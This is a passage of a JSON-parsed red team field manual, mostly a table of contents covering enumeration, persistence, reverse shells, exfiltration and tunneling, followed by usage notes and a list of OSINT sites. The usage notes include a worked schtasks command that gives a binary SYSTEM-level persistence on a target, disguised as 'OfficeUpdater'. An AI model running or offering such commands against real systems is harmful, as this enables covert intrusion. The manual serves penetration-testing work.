      }
    },
    {
      "type": "paragraph",
      "content": "Mac OS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mac OS Details",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mac OS Versions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "File System Structure",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mac OS System Enumeration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mac OS Situational Awareness",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User Plist File Enumeration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User enumeration & Modification",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Create user & make administrator",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Create A Group",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Group enumeration & Modification",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "*Nix",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux OS Details",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "File System Structure",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Important File/Directory Descriptions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/shadow File Format",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/shadow Hash Types",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "/etc/passwd File Format",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux System Enumeration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Operating System Information",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Manipulate Packages Using RPM (Red Hat)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Manipulate Packages Using DPKG",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Update System Using Apt Get",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Situational Awareness & Process Manipulation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User Account Enumeration & Configuration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Network Configuration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Network Configuration Cont",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNS Zone Transfer",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux File Manipulation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "File Manipulation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "File Compression & Chunking",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "File Hashing",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux Persistence",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "rc.local",
      "level": 0,
      "metadata": {
        "file_paths": [
          "rc.local"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux Service",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Crontab",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Poisoning Existing Scripts",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux Scripting",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux Post Exploitation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Misc Commands",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Mount USB Device",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Bash History Manipulation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux Tools",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SSH",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Setup SSH Keys",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SSH Forwarding/Tunneling",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "TCPDump & TCPReplay",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "TCPDump & TCPReplay Cont:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Screen",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IPTables",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IPTables Examples",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Service Manipulation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Solaris OS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Solaris File System Structure",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Solaris Commands",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Networking",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Common Ports",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Common Ports",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Health Care Protocol & Ports",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scada Protocols & Ports",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "TTL Fingerprinting",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IPv4",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Classful IPv4 Ranges",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Reserved Private Ranges",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Subnetting",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Calculating Subnet Range",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IPv6",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Broadcast Addresses",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Interface Addresses",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "IPV6 Tools",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Networking",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Cisco Commands",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SNMP Tools",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNSRecon & NMap Reverse DNS",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Technologies",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Wireless",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Frequency Chart",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Helpful RF Websites",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Kismet Command Reference",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux Wi-Fi Commands",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux Bluetooth",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux Wi-Fi Testing",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Wi-Fi DOS Attacks",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Web",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "User Agent String Keywords",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HTML Beef Hook Technique",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Embedded iframe",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Firefox Type Conversions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Wget Capture Session Token",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Curl",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Automated Web Screenshots (WitnessMe)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SQLMap",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Databases",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "MSSQL",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "POSTGRES",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "MySQL",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Oracle",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Tools",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Nmap",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scan Types",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scan Options",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Output/Input Options",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Firewall Evasion",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Misc Flags",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Wireshark",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Wireshark Filter Options",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Comparison Operators",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Logical Operators",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Wireshark Examples",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Netcat",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Netcat Examples",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Download a File",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Upload a File",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Metasploit",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Metasploit Options",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Create & Catch Payloads (msfvenom)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Start MSF DB (Kali)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Meterpreter Pass a Shell",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Meterpreter Commands",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Nmap Through Meterpreter Socks Proxy",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ettercap",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ettercap Commands",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ettercap Filter",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "hping3",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "arping",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Password Cracking",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Hydra",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "John The Ripper",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Crack Excel Password Protected Document",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Programming",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ASCII & Regex",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Regex Expressions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ASCII Table",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Python",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Python Port Scanner",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Python Base64 Wordlist",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Convert Windows Registry HEX Format To Readable ASCII",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Read All Files in Folder & Search For Regex",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SSL Encrypted SimpleHTTPServer",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Loop Through IP List, Download File Over HTTP & Execute",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Python Email Sender (SendMail Must Be Installed)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Generate Random String of N Length",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Python HTTP Server",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Custom Python HTTP Banner Grabber",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scapy",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Scapy Setup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Send IPv6 ICMP Message",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "UDP Packet With Specific Payload",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "NTP Fuzzer",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Send HTTP Message",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Perl",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Perl Port Scanner",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Tips & Tricks",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Tips & Tricks",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "FTP Through Non-Interactive Windows Shell",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNS Transfer on Linux",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Exfil Command Output on a Linux Machine Over ICMP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Sending Email From Open Relay (Telnet)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Reverse Shells",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Netcat",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Perl",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Python",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Bash",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Java",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "PHP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ruby",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Telnet",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "XTerm",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "WGET Script Download & Execute",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Tunneling",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "FPipe Tunnel",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Socat Tunnel",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SSL Encapsulated Netcat TunneL (STunnel)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Tradecraft Concerns",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Tradecraft Concerns",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Artifact Creation and Uploading",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Persistence Actions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Remote Execution",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Infrastructure Setup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Token Manipulation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "End of Day Operations",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Index",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Using the Red Team Field Manual (RTFM)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "RTFM How-To",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Commands and syntax are provided in a “table” format, and variables in commands are denoted as bold, italic, and surrounded by brackets.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "For example, to run the given command:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "schtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR <FILE_PATH> /s <IP_ADDRESS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "An operator must change the variable <FILE_PATH> to equal the full path of the uploaded file, and change <IP_ADDRESS> to equal the IP address of the target system.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Correctly modifying the above command for execution may look like:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "schtasks /Create /F /RU system /SC ONLOGON /TN OfficeUpdater /TR c:\\windows\\system32\\wups.exe /s 172.16.1.10",
      "level": 0,
      "metadata": {
        "file_paths": [
          "\\windows\\system32\\wups.exe",
          "172.16.1.10"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Many of the commands listed in this book may have other modifiable arguments. For example, in the command listed above, operators may also modify the name of the task by modifying the TN value. These types of replacements and modifications are not required but could be valuable to change.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Some commands may have “placeholder” variables added which make understanding the functionality of the command easier. For example, in the command and explanation below:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ssh –R 0.0.0.0:8080:127.0.0.1:443 root@<REMOTE_IP>",
      "level": 0,
      "metadata": {
        "file_paths": [
          "0.0.0.0",
          "127.0.0.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Explanation: “Connect to remote IP address, listen on ALL local IP addresses on port 8080, traverse SSH tunnel, and forward traffic to the local loopback IP on 443”",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "The IP addresses and ports were left in the command, to better describe its action and effect.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Commands were tested on the following updated operating systems:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows 10",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows Server 2022",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ubuntu 22.04 LTS",
      "level": 0,
      "metadata": {
        "file_paths": [
          "22.04"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Kali Linux 2022.2",
      "level": 0,
      "metadata": {
        "file_paths": [
          "2022.2"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Visit",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "www.theRTFM.com",
      "level": 0,
      "metadata": {
        "file_paths": [
          "www.theRTFM.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "for RTFM series updates, video guides, and more.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Open Source Intelligence (OSINT)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Network",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Network Resources",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dnsstuff.com/tools",
      "level": 0,
      "metadata": {
        "file_paths": [
          "dnsstuff.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNSstuff Toolbox",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "network-tools.com",
      "level": 0,
      "metadata": {
        "file_paths": [
          "network-tools.com"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Network-Tools",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "centralops.net",
      "level": 0,
      "metadata": {
        "file_paths": [
          "centralops.net"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "CentralOps",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "lg.he.net",
      "level": 0,
      "metadata": {
        "file_paths": [
          "lg.he.net"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Hurricane Electric",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "bgp4.as/looking-glasses",
      "level": 0,
      "metadata": {
        "file_paths": [
          "bgp4.as"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "BGP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "shodan.io",
      "level": 0,
      "metadata": {
        "file_paths": [
          "shodan.io"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Shodan",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "viz.greynoise.io",
      "level": 0,
      "metadata": {
        "file_paths": [
          "viz.greynoise.io"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "GreyNoise",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "mxtoolbox.com/NetworkTools.aspx",
      "level": 0,
      "metadata": {
        "file_paths": [
          "mxtoolbox.com/NetworkTools.aspx"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "MxToolBox",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
